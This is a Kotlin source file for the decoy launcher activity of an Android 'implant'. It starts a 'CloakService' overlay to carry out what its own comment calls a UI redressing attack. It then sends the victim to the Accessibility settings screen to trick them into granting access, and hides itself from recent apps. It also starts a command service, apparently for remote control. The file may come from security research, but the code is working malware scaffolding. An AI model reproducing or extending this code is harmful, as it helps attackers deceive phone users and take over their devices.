package com.cooperthecoder.implant.decoy

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.support.v7.app.AppCompatActivity
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.cloak.CloakService
import com.cooperthecoder.implant.command.CommandService
import com.cooperthecoder.implant.command.StartCommandServiceJob
import com.cooperthecoder.implant.dagger.DaggerService


class MainActivity : AppCompatActivity() {

    private val REQUEST_CODE_OVERLAY = 5463

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!overlayPermissionRequired()) {
            startCloakService()
        }
    }

    override fun onResume() {
        super.onResume()
        if (Config.DEBUG) {
            startService(CommandService.intent(this))
        }
    }

    private fun startCloakService() {
        // No need for the cloak if the dagger already came out
        if (!DaggerService.isRunning()) {
            // Start the cloak service to begin the UI redressing attack
            startService(Intent(this, CloakService::class.java))
            // Launch victim settings activity and close this activity.
            val flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .setFlags(flags))
            finish()
        }
    }

    private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
            startCloakService()
        }
    }
}
